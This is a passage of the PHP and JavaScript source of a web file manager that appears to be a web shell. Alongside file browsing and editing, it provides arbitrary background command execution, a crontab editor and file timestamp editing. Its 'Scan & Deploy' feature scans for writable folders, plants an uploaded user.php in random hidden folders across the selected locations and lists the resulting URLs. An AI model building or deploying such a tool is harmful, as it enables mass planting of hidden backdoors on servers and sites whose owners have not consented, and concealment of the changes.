        <button class="tab-btn" onclick="switchTab(this,'tab-security')">Security</button>
        <button class="tab-btn" onclick="switchTab(this,'tab-about')">About</button>
      </div>
      <div class="tab-pane active" id="tab-general">
        <div class="form-group">
          <label><?= t('language') ?></label>
          <select class="form-control" id="set-lang">
            <option value="en" <?= $CONFIG['lang']==='en'?'selected':'' ?>>English</option>
            <option value="id" <?= $CONFIG['lang']==='id'?'selected':'' ?>>Bahasa Indonesia</option>
          </select>
        </div>
        <div class="form-group">
          <label><?= t('theme') ?></label>
          <select class="form-control" id="set-theme">
            <option value="dark" <?= $CONFIG['theme']==='dark'?'selected':'' ?>>Dark</option>
            <option value="light" <?= $CONFIG['theme']==='light'?'selected':'' ?>>Light</option>
          </select>
        </div>
        <div class="form-group">
          <label><?= t('date_format') ?></label>
          <input type="text" class="form-control mono" id="set-date-format" value="<?= htmlspecialchars($CONFIG['date_format']) ?>">
        </div>
        <div class="form-check">
          <input type="checkbox" id="set-show-hidden" <?= $CONFIG['show_hidden']?'checked':'' ?>>
          <label for="set-show-hidden"><?= t('show_hidden') ?></label>
        </div>
      </div>
      <div class="tab-pane" id="tab-security">
        <div style="padding:14px;background:rgba(110,231,183,0.06);border:1px solid var(--accent-dim);border-radius:8px;margin-bottom:18px">
          <div style="font-size:13px;font-weight:600;color:var(--accent);margin-bottom:10px">
            <i class="fa-solid fa-key"></i> Change My Password
          </div>
          <div class="form-group">
            <label style="font-size:12px">Current Password</label>
            <input type="password" class="form-control" id="cp-old" placeholder="Enter current password">
          </div>
          <div class="form-group">
            <label style="font-size:12px">New Password (min 6 characters)</label>
            <input type="password" class="form-control" id="cp-new" placeholder="Enter new password">
          </div>
          <div class="form-group">
            <label style="font-size:12px">Confirm New Password</label>
            <input type="password" class="form-control" id="cp-confirm" placeholder="Re-enter new password">
          </div>
          <button class="btn btn-primary btn-sm" onclick="changeMyPassword()">
            <i class="fa-solid fa-shield-halved"></i> Update Password
          </button>
          <div id="cp-result" style="margin-top:10px;font-size:12px"></div>
          <p style="font-size:11px;color:var(--text-muted);margin-top:10px;line-height:1.5">
            New password is saved to <code style="font-family:var(--font-mono)">filepro-config.php</code> and persists across script updates. You'll be logged out after a successful change.
          </p>
        </div>

        <div style="border-top:1px solid var(--border);padding-top:14px">
          <p style="font-size:13px; color:var(--text-muted); margin-bottom:12px"><?= t('hash_gen') ?></p>
          <div class="form-group">
            <label><?= t('pwd_input') ?></label>
            <input type="text" class="form-control" id="hash-input" placeholder="Enter password...">
          </div>
          <button class="btn btn-ghost btn-sm" onclick="generateHash()"><i class="fa-solid fa-key"></i> <?= t('generate') ?></button>
          <div class="form-group mt-3">
            <textarea class="form-control mono" id="hash-output" rows="2" readonly placeholder="Hash will appear here..."></textarea>
          </div>
        </div>
      </div>
      <div class="tab-pane" id="tab-about">
        <div style="text-align:center; padding:20px 0">
          <span class="about-logo-text">_&lt;</span>
          <h2 style="font-family:var(--font-display); margin-top:12px; font-size:18px; font-weight:600"><?= FM_TITLE ?></h2>
          <p style="color:var(--text-dim); margin-top:6px; font-size:12px">Version <?= FM_VERSION ?></p>
          <p style="color:var(--text-muted); margin-top:16px; font-size:12px">Created by SEO PENJAGA BUMI</p>
          <p style="color:var(--text-dim); font-size:11px; margin-top:6px">PHP <?= PHP_VERSION ?></p>
        </div>
      </div>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-settings')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="saveSettings()"><?= t('save') ?></button>
    </div>
  </div>
</div>

<!-- Crontab -->
<div class="modal-backdrop" id="modal-crontab">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-clock-rotate-left" style="color:var(--accent)"></i>
      <h3>Crontab Editor</h3>
      <button class="icon-btn" onclick="closeModal('modal-crontab')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <p style="font-size:12px; color:var(--text-dim); margin-bottom:10px">Edit cron jobs. One per line. Format: <code>MIN HOUR DOM MON DOW CMD</code></p>
      <textarea id="crontab-editor" class="form-control mono" style="min-height:250px; font-size:13px; line-height:1.7" spellcheck="false"></textarea>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-crontab')"><?= t('cancel') ?></button>
      <button class="btn btn-primary" onclick="saveCrontab()"><i class="fa-solid fa-floppy-disk"></i> <?= t('save') ?></button>
    </div>
  </div>
</div>

<!-- Nohup -->
<!-- Nohup -->
<div class="modal-backdrop" id="modal-nohup">
  <div class="modal">
    <div class="modal-header">
      <i class="fa-solid fa-rocket" style="color:var(--accent)"></i>
      <h3>Run Background Process</h3>
      <button class="icon-btn" onclick="closeModal('modal-nohup')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <div class="form-group">
        <label>Command</label>
        <input type="text" id="nohup-cmd" class="form-control mono" placeholder="e.g. python3 script.py" autocomplete="off">
      </div>
      <p style="font-size:12px; color:var(--text-dim)">Runs in background using <code>nohup</code>. Output goes to a temp log file. Working dir: <code id="nohup-cwd">/</code></p>
    </div>
    <div class="modal-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-nohup')"><?= t('cancel') ?></button>
      <button class="btn btn-success" onclick="doNohup()"><i class="fa-solid fa-play"></i> Run</button>
    </div>
  </div>
</div>

<!-- Processes -->
<div class="modal-backdrop" id="modal-processes">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-microchip" style="color:var(--accent)"></i>
      <h3>Running Processes</h3>
      <div style="display:flex;gap:6px;margin-left:auto">
        <button class="btn btn-ghost btn-sm" onclick="loadProcesses()"><i class="fa-solid fa-rotate-right"></i> Refresh</button>
        <?php if (!$is_readonly): ?>
        <button class="btn btn-ghost btn-sm" onclick="openNohup()"><i class="fa-solid fa-rocket"></i> Nohup</button>
        <?php endif; ?>
        <button class="icon-btn" onclick="closeModal('modal-processes')"><i class="fa-solid fa-xmark"></i></button>
      </div>
    </div>
    <div class="modal-body">
      <pre id="processes-output" class="preview-text" style="max-height:55vh; font-size:12px; line-height:1.5">Loading...</pre>
    </div>
  </div>
</div>

<!-- Scan & Deploy -->
<div class="modal-backdrop" id="modal-scan-deploy">
  <div class="modal modal-lg">
    <div class="modal-header">
      <i class="fa-solid fa-satellite-dish" style="color:var(--accent)"></i>
      <h3>Scan &amp; Deploy</h3>
      <button class="icon-btn" onclick="closeModal('modal-scan-deploy')"><i class="fa-solid fa-xmark"></i></button>
    </div>
    <div class="modal-body">
      <!-- Phase 1: Pick folder -->
      <div class="sd-phase active" id="sd-phase-pick">
        <div style="margin-bottom:10px;font-size:12px;color:var(--text-muted)">
          <i class="fa-solid fa-folder-open" style="color:var(--accent)"></i>
          Navigate to the root directory you want to scan, then click <b>Scan This Folder</b>.
        </div>
        <div id="sd-breadcrumb" style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;padding:8px 10px;background:var(--bg-overlay);border-radius:var(--r-md);margin-bottom:8px;font-size:12px;min-height:36px"></div>
        <div id="sd-folder-list" style="max-height:40vh;overflow-y:auto;border:1px solid var(--border-dim);border-radius:var(--r-md)"></div>
      </div>
      <!-- Phase 2: Scanning -->
      <div class="sd-phase" id="sd-phase-scan">
        <div id="sd-scan-loading" style="display:flex;align-items:center;gap:10px;padding:30px;justify-content:center">
          <div class="spinner"></div> <span id="sd-scan-msg">Scanning folders recursively...</span>
        </div>
      </div>
      <!-- Phase 3: Results -->
      <div class="sd-phase" id="sd-phase-results">
        <div class="sd-stats" id="sd-stats"></div>
        <div style="max-height:40vh;overflow-y:auto">
          <table class="sd-table">
            <thead>
              <tr>
                <th><input type="checkbox" id="sd-select-all" onchange="sdToggleAll(this.checked)"></th>
                <th>Folder</th>
                <th>Path</th>
                <th>Writable</th>
                <th>Status</th>
              </tr>
            </thead>
            <tbody id="sd-tbody"></tbody>
          </table>
        </div>
        <div style="margin-top:12px;padding:10px 12px;background:var(--bg-overlay);border:1px dashed var(--border);border-radius:var(--r-md);display:flex;align-items:center;gap:10px">
          <i class="fa-solid fa-file-arrow-up" style="color:var(--accent);font-size:16px"></i>
          <div style="flex:1">
            <label for="sd-user-file" style="font-size:12px;font-weight:600;color:var(--text-main);cursor:pointer">Upload your user.php</label>
            <div style="font-size:11px;color:var(--text-muted)">This file will be deployed as user.php to a random hidden folder in selected locations</div>
            <input type="file" id="sd-user-file" accept=".php" style="margin-top:6px;font-size:12px">
          </div>
        </div>
      </div>
      <!-- Phase 4: Deploying -->
      <div class="sd-phase" id="sd-phase-deploying">
        <div style="display:flex;align-items:center;gap:10px;padding:30px;justify-content:center">
          <div class="spinner"></div> <span id="sd-deploy-status">Deploying user.php to selected locations...</span>
        </div>
      </div>
      <!-- Phase 5: Done -->
      <div class="sd-phase" id="sd-phase-done">
        <div class="sd-stats" id="sd-deploy-stats"></div>
        <div class="form-group">
          <label>Generated URLs (copy all)</label>
          <textarea class="sd-url-box" id="sd-url-list" readonly onclick="this.select()"></textarea>
        </div>
        <div id="sd-deploy-errors" style="margin-top:10px"></div>
      </div>
    </div>
    <div class="modal-footer" id="sd-footer">
      <button class="btn btn-ghost" onclick="closeModal('modal-scan-deploy')">Close</button>
      <button class="btn btn-primary" id="sd-btn-scan" onclick="sdDoScan()" style="display:none">
        <i class="fa-solid fa-magnifying-glass"></i> Scan This Folder
      </button>
      <button class="btn btn-primary" id="sd-btn-deploy" onclick="doDeployVhosts()" style="display:none">
        <i class="fa-solid fa-rocket"></i> Deploy Selected
      </button>
      <button class="btn btn-success" id="sd-btn-copy" onclick="sdCopyUrls()" style="display:none">
        <i class="fa-solid fa-clipboard"></i> Copy All URLs
      </button>
      <button class="btn btn-ghost" id="sd-btn-rescan" onclick="sdRescan()" style="display:none">
        <i class="fa-solid fa-rotate-right"></i> Re-scan
      </button>
    </div>
  </div>
</div>

<!-- CodeMirror JS -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/addon/edit/matchbrackets.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/php/php.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/python/python.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/shell/shell.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/yaml/yaml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/markdown/markdown.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/sql/sql.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.16/mode/clike/clike.min.js"></script>

<script>
'use strict';
// ──────────────────────────────────────────────
// GLOBAL STATE
// ──────────────────────────────────────────────
const FM = {
  SELF:     '<?= FM_SELF ?>',
  TOKEN:    '<?= $_SESSION['_token'] ?>',
  READONLY: <?= $is_logged && $is_readonly ? 'true' : 'false' ?>,
  ROOT_URL: '<?= htmlspecialchars(rtrim(str_replace(basename($_SERVER['PHP_SELF']),'',$_SERVER['PHP_SELF']),'/'). '/') ?>',
  INITIAL_PATH: '<?= htmlspecialchars($initial_path ?? '') ?>',
  WP_ROOT:  <?php echo ($is_logged && ($__wp = fm_wp_detect())) ? json_encode($__wp) : 'null'; ?>,
};

const state = {
  path:        '',
  items:       [],
  selected:    new Set(),
  view:        localStorage.getItem('fm_view') || 'grid',
  theme:       document.documentElement.dataset.theme,
  sortKey:     'name',
  sortAsc:     true,
  history:     [''],
  historyIdx:  0,
  previewFile: null,
  editorCM:    null,
  editorFile:  null,
  termCwd:     '',
  termHistory: [],
  termHistIdx: -1,
  absPath:     '',
};

// ──────────────────────────────────────────────
// API
// ──────────────────────────────────────────────
async function api(action, data = {}, method = 'POST') {
  const fd = new FormData();
  fd.append('action', action);
  fd.append('_token', FM.TOKEN);
  for (const [k,v] of Object.entries(data)) {
    if (v !== undefined) fd.append(k, typeof v === 'object' ? JSON.stringify(v) : v);
  }
  const r = await fetch(FM.SELF, { method, body: fd });
  const json = await r.json().catch(() => ({ ok: false, msg: 'Parse error' }));
  return json;
}

async function apiGet(action, params = {}) {
  const qs = new URLSearchParams({ action, ...params });
  const r = await fetch(`${FM.SELF}?${qs}`);
  return r.json().catch(() => ({ ok: false, msg: 'Parse error' }));
}

// ──────────────────────────────────────────────
// NAVIGATION
// ──────────────────────────────────────────────
async function navigate(path, pushHistory = true) {
  // Normalize slashes but preserve leading / for absolute paths
  path = path.replace(/\/+/g, '/').replace(/\/$/g, '');
  if (path === '/') path = '';
  // Only strip leading / for relative paths (not absolute)
  if (!path.startsWith('/')) path = path.replace(/^\//, '');

  setLoading(true);
  const res = await api('list', { path });
  setLoading(false);
  if (!res.ok) { toast(res.msg, 'error'); return; }

  state.path = path;
  state.absPath = res.data.abs_path || '/';
  state.items = [
    ...res.data.folders.map(f => ({...f, _isDir: true})),
    ...res.data.files.map(f => ({...f, _isDir: false})),
  ];
  state.selected.clear();

  if (pushHistory) {
    state.history = state.history.slice(0, state.historyIdx + 1);
    state.history.push(path);
    state.historyIdx = state.history.length - 1;
  }

  // Save path to URL hash so refresh stays in current folder
  if (path) {
    location.hash = encodeURIComponent(path);
  } else {
    // Remove hash when at root without triggering hashchange
    history.replaceState(null, '', location.pathname + location.search);
  }

  renderBreadcrumb(path, state.absPath);
  renderFiles();
  updateStatusBar();
  loadTree(path);
  updateSelectionUI();
  document.getElementById('sb-path').textContent = state.absPath;
  document.getElementById('sb-path').title = state.absPath;
  const termCwdEl = document.getElementById('term-cwd');
  if (termCwdEl) termCwdEl.textContent = state.absPath;
  const termPromptEl = document.getElementById('term-prompt-label');
  if (termPromptEl) termPromptEl.textContent =
    (state.absPath ? state.absPath.split('/').pop() || '~' : '~') + ' $';
  state.termCwd = path;
}

function goBack() {
  if (state.historyIdx > 0) {
    state.historyIdx--;
    navigate(state.history[state.historyIdx], false);
  } else if (state.path) {
    const idx = state.path.lastIndexOf('/');
    const parent = idx > 0 ? state.path.substring(0, idx) : '';
    navigate(parent);
  }
}


// ──────────────────────────────────────────────
// BREADCRUMB
// ──────────────────────────────────────────────
function renderBreadcrumb(relPath, absPath) {
  const bc = document.getElementById('breadcrumb');
  if (!absPath) absPath = '/';

  // Split absolute path into segments
  const absParts = absPath.replace(/^\/+/, '').split('/').filter(Boolean);

  // Pin icon → go to FM root
  let html = `<span class="crumb" onclick="navigate('')"><i class="fa-solid fa-map-pin" style="font-size:11px;color:var(--accent)"></i></span>`;

  // Render ALL segments using absolute paths for clicks
  for (let i = 0; i < absParts.length; i++) {
    const clickPath = '/' + absParts.slice(0, i + 1).join('/');
    const isLast = (i === absParts.length - 1);
    html += `<span class="sep">/</span>`;
    html += `<span class="crumb ${isLast?'active':''}" onclick="navigate('${esc(clickPath)}')">${esc(absParts[i])}</span>`;
  }
  html += `<span class="sep">/</span>`;
  bc.innerHTML = html;
}

// For backward compat — just calls navigate with absolute path
function navigateAbsolute(absDir) {
  navigate(absDir);
}


// ──────────────────────────────────────────────
// FILE RENDERING
// ──────────────────────────────────────────────
function renderFiles() {
  const items = getSortedItems();
  const grid  = document.getElementById('files-grid');
  const tbody = document.getElementById('files-tbody');
  const empty = document.getElementById('empty-state');

  if (items.length === 0) {
    grid.innerHTML = '';
    tbody.innerHTML = '';
    empty.style.display = 'flex';
    return;
  }
  empty.style.display = 'none';

  // ── Grid ─────────────────────────────────
  grid.innerHTML = items.map(item => {
    const isDir  = item._isDir;
    const name   = item.name;
    const rel    = (state.path ? state.path + '/' : '') + name;
    const type   = isDir ? 'dir' : (item.ftype || 'binary');
    const sel    = state.selected.has(rel);
    const iconEl = getIconEl(item);
    return `<div class="file-card type-${type} ${sel?'selected':''}"
      data-path="${esc(rel)}"
      data-is-dir="${isDir}"
      onclick="handleClick(event, '${esc(rel)}', ${isDir})"
      ondblclick="handleDblClick('${esc(rel)}', ${isDir})"
      oncontextmenu="showCtx(event, '${esc(rel)}', ${isDir})"
      draggable="true"
      ondragstart="onDragStart(event,'${esc(rel)}')">
      <div class="card-check">
        <i class="fa-solid fa-check" style="font-size:10px"></i>
      </div>
      <div class="card-icon">${iconEl}</div>
      <div class="card-name" title="${esc(name)}">${esc(name)}</div>
      <div class="card-meta">${isDir ? '<i class="fa-solid fa-folder-open" style="font-size:10px"></i>' : item.size_fmt || ''}</div>
    </div>`;
  }).join('');

  // ── Table ────────────────────────────────
  tbody.innerHTML = items.map(item => {
    const isDir = item._isDir;
    const name  = item.name;
    const rel   = (state.path ? state.path + '/' : '') + name;
    const type  = isDir ? 'dir' : (item.ftype || 'binary');
    const sel   = state.selected.has(rel);
    const iconEl = getIconEl(item);
    return `<tr class="${sel?'selected':''}"
      data-path="${esc(rel)}"
      data-is-dir="${isDir}"
      onclick="handleClick(event, '${esc(rel)}', ${isDir})"
      ondblclick="handleDblClick('${esc(rel)}', ${isDir})"
      oncontextmenu="showCtx(event, '${esc(rel)}', ${isDir})">
      <td class="td-check"><input type="checkbox" class="cb" ${sel?'checked':''} onclick="event.stopPropagation();toggleSelect('${esc(rel)}')"></td>
      <td>
        <div class="file-row-name" style="color:${isDir?'#fbbf24':'inherit'}">
          ${iconEl}
          ${esc(name)}
          ${item.is_link ? '<span class="badge">LINK</span>' : ''}
        </div>
      </td>
      <td class="td-size">${isDir ? '&mdash;' : (item.size_fmt || '')}</td>
      <td class="td-date" ${!FM.READONLY ? `style="cursor:pointer" title="Click to edit date" onclick="event.stopPropagation();inlineEdit(this,'${esc(rel)}','date',${item.mtime||0})"` : ''}>${item.mtime_fmt || ''}</td>
      <td class="td-perms perms-col ${permClass(item.perms)}" ${!FM.READONLY ? `style="cursor:pointer" title="Click to edit permissions" onclick="event.stopPropagation();inlineEdit(this,'${esc(rel)}','perms','${esc(item.perms||'0644')}')"` : ''}><code>${item.perms || ''}</code></td>
      <td class="perms-col" style="font-size:11px; color:var(--text-dim)">${item.owner || ''}</td>
      <td>
        <div style="display:flex; gap:3px">
          ${!isDir ? `<button class="btn btn-ghost btn-sm btn-icon" title="Preview" onclick="event.stopPropagation();previewFile('${esc(rel)}')"><i class="fa-regular fa-eye"></i></button>` : ''}
          ${!FM.READONLY ? `<button class="btn btn-ghost btn-sm btn-icon" title="Rename" onclick="event.stopPropagation();openRename('${esc(rel)}')"><i class="fa-solid fa-pen"></i></button>` : ''}
        </div>
      </td>
    </tr>`;
  }).join('');
}

function getIconEl(item) {
  if (!item._isDir && item.ftype === 'image') {
    const rel = (state.path ? state.path + '/' : '') + item.name;
    return `<img class="${state.view === 'grid' ? 'img-thumb' : 'file-row-thumb'}"
      src="${FM.SELF}?action=download&path=${encodeURIComponent(rel)}"
      onerror="this.style.display='none';this.nextSibling.style.display='inline-block'"
      loading="lazy">
      <i class="fa-solid ${item.icon||'fa-file'}" style="display:none"></i>`;
  }
  const color = {
    dir: '#fbbf24', image: '#a78bfa', video: '#f87171',
    audio: '#34d399', text: '#60a5fa', archive: '#fb923c',
    pdf: '#f87171', binary: 'var(--text-dim)',
  };
  const type = item._isDir ? 'dir' : (item.ftype || 'binary');
  const icon = item._isDir ? 'fa-folder' : (item.icon || 'fa-file');
  return `<i class="fa-solid ${icon}" style="color:${color[type]||'var(--text-dim)'}"></i>`;
}

function getSortedItems() {
  const items = [...state.items];
  const key = state.sortKey;
  const asc = state.sortAsc ? 1 : -1;
  items.sort((a, b) => {
    if (a._isDir !== b._isDir) return a._isDir ? -1 : 1;
    let va = a[key] ?? '', vb = b[key] ?? '';
    if (key === 'size' || key === 'mtime') {
      va = Number(va); vb = Number(vb);
      return (va - vb) * asc;
    }
    return String(va).localeCompare(String(vb)) * asc;
  });
  return items;
}

function sortBy(key) {
  if (state.sortKey === key) state.sortAsc = !state.sortAsc;
  else { state.sortKey = key; state.sortAsc = true; }
  ['name','size','mtime'].forEach(k => {
    const el = document.getElementById('sort-' + k);
    if (el) el.innerHTML = '';
  });
  const el = document.getElementById('sort-' + key);
  if (el) el.innerHTML = state.sortAsc
    ? '<i class="fa-solid fa-caret-up"></i>'
    : '<i class="fa-solid fa-caret-down"></i>';
  renderFiles();
}

// ──────────────────────────────────────────────
// SELECTION
// ──────────────────────────────────────────────
function handleClick(e, path, isDir) {
  // Readonly users: single click navigates folders directly
  if (FM.READONLY && isDir) {
    navigate(path);
    return;
  }
  if (e.shiftKey || e.ctrlKey || e.metaKey) {
    toggleSelect(path);
  }
}

function handleDblClick(path, isDir) {
  if (isDir) navigate(path);
  else previewFile(path);
}

function toggleSelect(path) {
  if (state.selected.has(path)) state.selected.delete(path);
  else state.selected.add(path);
  updateSelectionUI();
  renderFiles();
}

function toggleSelectAll(checked) {
  if (checked) {
    state.items.forEach(i => {
      const rel = (state.path ? state.path + '/' : '') + i.name;
      state.selected.add(rel);
    });
  } else {
    state.selected.clear();
  }
  updateSelectionUI();
  renderFiles();
}

function updateSelectionUI() {
  const n = state.selected.size;
  const info = document.getElementById('sel-info');
  const btns = ['btn-copy-to','btn-move-to','btn-zip-sel','btn-delete-sel'];
  if (n > 0) {
    info.textContent = `${n} selected`;
    btns.forEach(id => { const el = document.getElementById(id); if(el) el.style.display=''; });
  } else {
    info.textContent = '';
    btns.forEach(id => { const el = document.getElementById(id); if(el) el.style.display='none'; });
  }
  const sa = document.getElementById('select-all');
  if (sa) sa.checked = n > 0 && n === state.items.length;
}

// ──────────────────────────────────────────────
// STATUS BAR
// ──────────────────────────────────────────────
function updateStatusBar() {
  const dirs  = state.items.filter(i => i._isDir).length;
  const files = state.items.filter(i => !i._isDir).length;
  const total = state.items.filter(i => !i._isDir).reduce((s,i) => s + (i.size||0), 0);
  document.getElementById('sb-counts').textContent =
    `${dirs} folders, ${files} files`;
  document.getElementById('sb-size').textContent =
    total > 0 ? formatSize(total) : '';
}

function formatSize(b) {
  const u = ['B','KB','MB','GB','TB'];
  let i = 0;
  while (b >= 1024 && i < 4) { b /= 1024; i++; }
  return b.toFixed(1) + ' ' + u[i];
}

// ──────────────────────────────────────────────
// FOLDER TREE
// ──────────────────────────────────────────────
async function loadTree(activePath) {
  const el = document.getElementById('folder-tree');
  await renderTreeLevel(el, '', activePath, 0);
}

async function renderTreeLevel(container, path, activePath, depth) {
  const res = await api('tree', { path });
  if (!res.ok) return;
  container.innerHTML = '';

  // Show "go up" option if not at root and allow_above_root enabled
  <?php if ($CONFIG['allow_above_root']): ?>
  if (path) {
    const parent = path.includes('/') ? path.replace(/\/[^/]+$/, '') : '';
    const up = document.createElement('div');
    up.className = 'tree-item';
    up.innerHTML = `<i class="fa-solid fa-arrow-up" style="font-size:10px;color:var(--text-dim)"></i> ..`;
    up.onclick = () => navigate(parent);
    container.appendChild(up);
  }
  <?php endif; ?>

  for (const dir of res.data) {
    const item = document.createElement('div');
    item.className = 'tree-item' + (activePath === dir.path || activePath.startsWith(dir.path + '/') ? ' active' : '');
    item.innerHTML = `<i class="fa-solid fa-folder" style="color:#fbbf24; font-size:12px"></i> ${esc(dir.name)}`;
    item.onclick = (e) => { e.stopPropagation(); navigate(dir.path); };
    container.appendChild(item);
  }
}

// ──────────────────────────────────────────────
// PREVIEW
// ──────────────────────────────────────────────
async function previewFile(path) {
  state.previewFile = path;
  document.getElementById('preview-title').textContent = path.split('/').pop();
  document.getElementById('preview-content').innerHTML = '<div style="display:flex;justify-content:center;padding:40px"><div class="spinner"></div></div>';
  openModal('modal-preview');

  const res = await api('read', { path });
  if (!res.ok) { document.getElementById('preview-content').innerHTML = `<p style="color:var(--danger)">${esc(res.msg)}</p>`; return; }

  const d = res.data;
  const editBtn = document.getElementById('btn-preview-edit');
  if (editBtn) editBtn.style.display = d.type === 'text' ? '' : 'none';

  let html = '';
  if (d.type === 'image') {
    html = `<img src="${FM.SELF}?action=download&path=${encodeURIComponent(path)}" alt="${esc(d.name)}" style="max-width:100%;max-height:70vh;border-radius:8px">`;
  } else if (d.type === 'video') {
    html = `<video controls style="max-width:100%;max-height:70vh;border-radius:8px"><source src="${FM.SELF}?action=download&path=${encodeURIComponent(path)}"></video>`;
  } else if (d.type === 'audio') {
    html = `<audio controls style="width:100%"><source src="${FM.SELF}?action=download&path=${encodeURIComponent(path)}"></audio>`;
  } else if (d.type === 'pdf') {
    html = `<iframe class="pdf-frame" src="${FM.SELF}?action=download&path=${encodeURIComponent(path)}"></iframe>`;
  } else if (d.type === 'text') {
    const lines = (d.content||'').split('\n').length;
    html = `<div class="preview-text">${esc(d.content||'')}</div>`;
    if (lines > 500) html = `<div class="preview-text">${esc((d.content||'').split('\n').slice(0,500).join('\n'))}
\n<span style="color:var(--text-dim);font-style:italic">... (${lines} total lines, showing first 500)</span></div>`;
  } else if (d.type === 'archive' && d.entries) {
    html = `<div class="arch-list">${d.entries.map(e =>
      `<div class="arch-item ${e.dir?'arch-dir':''}">
        <i class="fa-solid fa-${e.dir?'folder':'file'}" style="font-size:11px"></i>
        ${esc(e.name)}
        <span class="arch-size">${e.dir ? '' : formatSize(e.size)}</span>
      </div>`
    ).join('')}</div>`;
  } else {
    html = `<p style="color:var(--text-muted);padding:20px">No preview available for this file type.</p>`;
  }

  // Append file info
  html += `<div class="props-grid mt-4">
    <div class="prop-item"><label>Name</label><div class="prop-value">${esc(d.name)}</div></div>
    <div class="prop-item"><label>Size</label><div class="prop-value">${d.size_fmt}</div></div>
    <div class="prop-item"><label>MIME</label><div class="prop-value">${esc(d.mime||'')}</div></div>
    <div class="prop-item"><label>Modified</label><div class="prop-value">${esc(d.mtime)}</div></div>
    ${d.width ? `<div class="prop-item"><label>Dimensions</label><div class="prop-value">${d.width} × ${d.height}</div></div>` : ''}
  </div>`;

  document.getElementById('preview-content').innerHTML = html;
}

// ──────────────────────────────────────────────
// EDITOR
// ──────────────────────────────────────────────
let cmEditor = null;

async function openEditor(path) {
  closeModal('modal-preview');
  state.editorFile = path;
  document.getElementById('editor-title').textContent = path.split('/').pop();
  openModal('modal-editor');

  const res = await api('read', { path });
  if (!res.ok) { toast(res.msg, 'error'); return; }

  const content = res.data.content || '';
  const ext = path.split('.').pop().toLowerCase();

  const modeMap = {
    php:'php', js:'javascript', ts:'javascript', jsx:'jsx', tsx:'jsx',
    css:'css', less:'css', scss:'css', html:'htmlmixed', htm:'htmlmixed',
    xml:'xml', py:'python', sh:'shell', bash:'shell', yaml:'yaml', yml:'yaml',
    md:'markdown', sql:'sql', java:'clike', c:'clike', cpp:'clike', cs:'clike',
    json:'javascript',
  };

  const ta = document.getElementById('code-editor');

  // IMPORTANT: destroy old CodeMirror FIRST, before setting new content.
  // toTextArea() overwrites ta.value with old content, so it must happen before we set the new value.
  if (cmEditor) { cmEditor.toTextArea(); cmEditor = null; }
  ta.value = content;

  cmEditor = CodeMirror.fromTextArea(ta, {
    mode: modeMap[ext] || 'text',
    theme: document.documentElement.dataset.theme === 'dark' ? 'dracula' : 'default',
    lineNumbers: true,
    matchBrackets: true,
    indentUnit: 2,
    tabSize: 2,
    lineWrapping: false,
    autofocus: true,
  });
  setTimeout(() => {
    cmEditor.setSize('100%', '100%');
    cmEditor.refresh();
  }, 100);
}

async function saveFile() {
  const content = cmEditor ? cmEditor.getValue() : document.getElementById('code-editor').value;
  const res = await api('save', { path: state.editorFile, content });
  if (res.ok) toast('Saved!', 'success');
  else toast(res.msg, 'error');
}

// ──────────────────────────────────────────────
// FILE OPERATIONS
// ──────────────────────────────────────────────
async function createNewItem() {
  const name = document.getElementById('new-item-name').value.trim();
  const type = document.getElementById('rb-folder').classList.contains('selected') ? 'folder' : 'file';
  if (!name) return;
  const action = type === 'folder' ? 'mkdir' : 'mkfile';
  const res = await api(action, { path: state.path, name });
  closeModal('modal-new-item');
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

function openRename(path) {
  const name = path.split('/').pop();
  document.getElementById('rename-input').value = name;
  document.getElementById('rename-from').value = path;
  openModal('modal-rename');
  setTimeout(() => {
    const inp = document.getElementById('rename-input');
    inp.focus();
    const dotIdx = name.lastIndexOf('.');
    if (dotIdx > 0) inp.setSelectionRange(0, dotIdx);
    else inp.select();
  }, 150);
}

async function doRename() {
  const from = document.getElementById('rename-from').value;
  const to   = document.getElementById('rename-input').value.trim();
  if (!to) return;
  const res = await api('rename', { from, to });
  closeModal('modal-rename');
  if (res.ok) { toast(res.msg, 'success'); navigate(state.path); }
  else toast(res.msg, 'error');
}

// ── INLINE EDIT (date/time + permissions) ────
function inlineEdit(cell, path, kind, current) {
  if (cell.querySelector('input')) return;
  const old = cell.innerHTML;
  let inputHtml;
  if (kind === 'date') {
    const d = new Date(current * 1000);
    const local = new Date(d.getTime() - d.getTimezoneOffset() * 60000).toISOString().slice(0, 16);
    inputHtml = `<input type="datetime-local" value="${local}" step="60" style="background:var(--bg-2);color:var(--text);border:1px solid var(--accent);border-radius:4px;padding:2px 4px;font-size:12px;width:100%">`;
  } else {
